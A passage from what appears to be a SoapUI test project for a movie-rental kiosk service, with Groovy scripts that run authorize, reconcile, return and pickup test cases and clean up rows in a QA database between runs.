tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("PromoValue"));
tc.setPropertyValue("DiscountAmountList", authtc.getPropertyValue("DiscountAmountList")); //PROMO
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
tc.setPropertyValue("HasUpsell",authtc.getPropertyValue("HasUpsell"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));
tc.setPropertyValue("RCFlag", authtc.getPropertyValue("RCFlag"));
tc.setPropertyValue("rentalRCFlag", authtc.getPropertyValue("rentalRCFlag"));
tc.setPropertyValue("purchaseRCFlag", authtc.getPropertyValue("purchaseRCFlag"));
//MDV
tc.setPropertyValue("RentalMDVFlag", authtc.getPropertyValue("RentalMDVFlag"));
tc.setPropertyValue("RentalMDVDiscNumber", authtc.getPropertyValue("RentalMDVDiscNumber"));
tc.setPropertyValue("PurchaseMDVFlag", authtc.getPropertyValue("PurchaseMDVFlag"));
tc.setPropertyValue("PurchaseMDVDiscNumber", authtc.getPropertyValue("PurchaseMDVDiscNumber"));

if (isOffline == 'true')
{
	//For Offline set the values to NULL
	tc.setPropertyValue("TransactionID", "null");
	tc.setPropertyValue("InvoiceID", "");
}
else
{
	tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
	tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
}

//tc.setPropertyValue("IsOffline", "false"); //hardCoded for time being.

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Reconcile] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="Return" id="4ef6e8f0-d53d-47e5-8a5a-24abb54ded85"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//get the Return Test case
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Return"];
def reconciletc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
def vendedBarcodes = reconciletc.getPropertyValue("VendedRentalBarcodes");
def TransactionID = reconciletc.getPropertyValue("TransactionID");
def CardType = reconciletc.getPropertyValue("CardType");
def InvoiceID = reconciletc.getPropertyValue("InvoiceID");
def IsOffline = reconciletc.getPropertyValue("IsOffline");
def RentalCount = reconciletc.getPropertyValue("VendedRentalsCount");
def PurchaseCount = reconciletc.getPropertyValue("VendedPurchaseCount");
def setDaysBack = Eval.me("[" + context.expand('${DataSource#SetDaysBack}') + "]");
def customerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
//log.info ("setDaysBack:$setDaysBack; vendedBarcodes:$vendedBarcodes");
vendedBarcodesList = vendedBarcodes.split(",");
//Added this logic to avoid bad data in datasource; test case failure due to bad data
if (vendedBarcodesList.size() != setDaysBack.size())
{
	def difference = (vendedBarcodesList.size() - setDaysBack.size())
     for (i = 0; i &lt; difference; i++)
     {
     	setDaysBack.add('0') //if the size is different add the default to 0
     }
}
else
{
     //nothing to do, code/data looks good
}
def setDaysBackList = setDaysBack.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");

//Get Scenario Count
testRunner.testCase.setPropertyValue("ScenarioCount", (testRunner.testCase.getPropertyValue("ScenarioCount").toShort() + 1 ).toString());
testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].setPropertyValue("TotalScenarioCount", (testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].getPropertyValue("TotalScenarioCount").toShort() + 1 ).toString())

//Call Return Step in for loop based on number of barcodes.
if (vendedBarcodes == "")
{
	log.info ("No Return is required");
	testRunner.gotoStepByName("DataSource Loop");
}
else
{
	for (r = 0; r &lt; vendedBarcodesList.size(); r++)
	{				
		curvendedBarcodes = vendedBarcodesList[r].toString().trim();
		cursetDaysBack = setDaysBackList[r].toString().trim()
		log.info ("SetDaysBack:$cursetDaysBack ;Barcode:$curvendedBarcodes");
		tc.setPropertyValue("Barcode", curvendedBarcodes);
		tc.setPropertyValue("SetDaysBack", cursetDaysBack);
		tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
		tc.setPropertyValue("TransactionID", TransactionID);
		tc.setPropertyValue("ReturnType", '6' );
		tc.setPropertyValue("FailedSecurityRead", 'False' );
		tc.setPropertyValue("CustomerProfileNumber", customerProfileNumber );
		tc.setPropertyValue("CardType", CardType);
		tc.setPropertyValue("InvoiceID", InvoiceID);
		tc.setPropertyValue("IsOffline", IsOffline);
		tc.setPropertyValue("RentalCount", RentalCount);
		tc.setPropertyValue("PurchaseCount", PurchaseCount);
	
		def runner = tc.run( null, false );
		// show that it worked out ok
		log.info("Status: $runner.status, time taken for TestCase [Return] was: $runner.timeTaken ms");
		def tcStatus = (runner.status).toString()
	//	assert runner.status != Status.FAILED : runner.reason
	
		if(tcStatus == "FAIL")
		{
			assert runner.status == Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
		}
		else
		{
			// assert that it didn't fail
			assert runner.status != Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("DataSource Loop");
		}
	
	}
}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="91f99800-d136-4442-ba10-3f0726e385da"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="bd64291f-623a-4d48-abd8-5dd9552c354b"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def rbconstring = rbConObj.getConnectionString();
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (19799,75692) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (19799,75692)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505")

testRunner.testCase.setPropertyValue("ScenarioCount", "0");</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");
def scenarioCount = context.expand( '${#TestCase#ScenarioCount}' )

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info("Scenario Count : $scenarioCount");
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1982939</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149058055</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">75527813105188</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>Reconcile PASS</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value>22</con:value></con:property><con:property><con:name>StartTime</con:name><con:value>12/26/18-14:17:05.064</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>12/26/18-14:19:35.072</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property><con:property><con:name>ScenarioCount</con:name><con:value>22</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>09eaa7a0-2291-4d7a-84cd-5c6da1e51274</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="10a7a312-2115-48b5-bccd-593cda9579c3" discardOkResults="true" failOnError="false" failTestCaseOnErrors="true" keepSession="false" name="Pickup" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" maxResults="0"><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="795c097d-6037-4648-b717-8c4de0f78d0c"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:assertion type="JDBC Status" id="e7a3f403-20b0-4593-81c5-1aceb211b870" name="JDBC Status"/><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="2b8fa6ee-f5a8-47ef-94a3-fc43f364954e"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.teststeps.datasource.DataSourceContainer@prepared-properties">&lt;xml-fragment/></con:setting></con:settings><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="Data Connection"><con:configuration><Connection>QaAutomation( QAInt )</Connection><query>Select 
	KS_Pickup.ID As ID, 
	KS_Pickup.Scenario As Scenario,
	KS_Pickup.Email As Email, 
	KS_Pickup.CreditCardNumber As Ccnumber, 
	KS_Pickup.CreditCardType As CCType,
	KS_Pickup.PromoCode As PromoCode, 
	KS_Pickup.PromoValue As PromoValue, 
	KS_Pickup.KioskID As KioskID,
	KS_Pickup.RentalFormats As rentalFormats,
	KS_Pickup.NumberOfRentals As numOfRentals,
	KS_Pickup.RentalVendStatus As RentalVendStatus,
	KS_Pickup.PurchaseFormats As PurchaseFormats,
	KS_Pickup.NumberOfPurchases As numOfPurchases,
	KS_Pickup.PurchaseVendStatus As PurchaseVendStatus,
	KS_Pickup.SetDaysBack As SetDaysBack, 
	KS_Pickup.LoyaltyFlag As LoyaltyFlag, 
	KS_Pickup.MDVFlag As MDVFlag, 
	KS_Pickup.MDVDiscNumber As MDVDiscNumber, 
	KS_Pickup.TestCaseName As TestCaseName
From KS_Pickup
Where TestCaseName = 'Pickup'</query><fetchSize/><stored-procedure>false</stored-procedure></con:configuration></con:dataSource><con:property>ID</con:property><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>LoyaltyFlag</con:property><con:property>MDVFlag</con:property><con:property>MDVDiscNumber</con:property><con:property>TestCaseName</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="c10bfbe6-a00f-477c-bb50-c5999ddad927"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("--------------------------------" + context.testCase.name + "-------------------------------");
log.info ("Scenario [$ScenarioNo]:Kiosk " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate, ServiceFeeTaxRate,ServiceFee  from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);
def serviceFeeTaxRate = (taxDetails.ServiceFeeTaxRate)!= null ? (taxDetails.ServiceFeeTaxRate) : "0.0000";
def serviceFeeAmount = (taxDetails.ServiceFee)!= null ? (taxDetails.ServiceFee) : "0.0000";

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate; ServiceFeeTaxRate:$serviceFeeTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeTaxRate',serviceFeeTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeAmount',serviceFeeAmount.toString());

def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
testRunner.testCase.setPropertyValue("AccountNumber",getCP.getPropertyValue("CpAccountNumber"));

//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Clear Open Rental and Reservations
def runCleanCustomer = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Cleanup Open Transactions"];
runCleanCustomer.setPropertyValue("CustomerId",CustomerID);
runCleanCustomer.setPropertyValue("kioskID",kioskID);
def CleanCustomerrunner = runCleanCustomer.run( null, false );	
// show that it worked out ok
log.info("Status: $CleanCustomerrunner.status, time taken for TestCase [Cleanup Open Transactions] was: $CleanCustomerrunner.timeTaken ms");
// assert that it didn't fail
assert CleanCustomerrunner.status != Status.FAILED : CleanCustomerrunner.reason

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="c41538ac-79b1-4248-9e03-c79f9fc5dc5e"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#LoyaltyFlag}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", "false");
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
tc.setPropertyValue("HasUpsell", "false");
tc.setPropertyValue("HasOffer", "false");
tc.setPropertyValue("MDVFlag", context.expand( '${DataSource#MDVFlag}' ));
tc.setPropertyValue("MDVDiscNumber",context.expand( '${DataSource#MDVDiscNumber}' ));

//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Authorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("FailCount",(testRunner.testCase.getPropertyValue("FailCount").toShort() + 1 ).toString());
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="GenerateReferenceNumber" id="366bea86-52a2-4167-af5c-4d9d07ce33d2"><con:settings/><con:config><script>//NOTES: Disabled extra logging; no need to delete them. 
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def qaConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('QaAutomation');
def rbconstring = rbConObj.getConnectionString();
def qaconstring = qaConObj.getConnectionString();
//Define the Connection
def rbsql = Sql.newInstance(rbconstring);
def qasql = Sql.newInstance(qaconstring);

//Generate new sequenceNumber
def generateSequenceNumber = rbsql.call("exec [dbo].[rb_GetNextReferenceNumber]");

//Get SequenceNumber
def getSequenceNumber = qasql.firstRow("Select ReferenceNumber from QA_ReferenceNumber");
def ReferenceNumber = getSequenceNumber.ReferenceNumber.toString();
log.info ("ReferenceNumber:$ReferenceNumber");
testRunner.testCase.setPropertyValue("ReferenceNumber",ReferenceNumber.toString())

//Build SQL Query to Insert
//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
def TransactionID = authtc.getPropertyValue("TransactionID")
def BarcodeForTnx = authtc.getPropertyValue("BarcodeForTnx");
def tnxDetails = rbsql.firstRow("Select ProcessorTran_ID,ApprovalCode,Rent_Date as RentDate,KioskClient_ID,ProcessorDeclinedCode,Add_Verification_Res,RentalTaxRate,AuthAmount,Customer_ID,InvoiceID,GetDate() As DateTime From [Transaction] Where Transaction_ID = $TransactionID");
def ProcessorTranID = tnxDetails.ProcessorTran_ID.toString();
def ApprovalCode = tnxDetails.ApprovalCode.toString();
def KioskID = tnxDetails.KioskClient_ID.toString();
def ProcessorDeclinedCode = tnxDetails.ProcessorDeclinedCode.toString();
def AVSResponseCode = tnxDetails.Add_Verification_Res.toString();
def SalesTaxRate = tnxDetails.RentalTaxRate.toString();
def AuthAmount = tnxDetails.AuthAmount.toString();
def CustomerID = tnxDetails.Customer_ID.toString();
def InvoiceID = tnxDetails.InvoiceID.toString();
def LastDateTime = tnxDetails.DateTime.toString();
def RentDate = tnxDetails.RentDate.toString();
def Email = context.expand( '${DataSource#Email}' );

def getWebAccountInfo = rbsql.firstRow("Select WebAccountID from WebAccount Where EmailAddress = '$Email'");
def WebAccountID = getWebAccountInfo.WebAccountID.toString();

log.info ("Barcode: $BarcodeForTnx; TransactionID:$TransactionID")
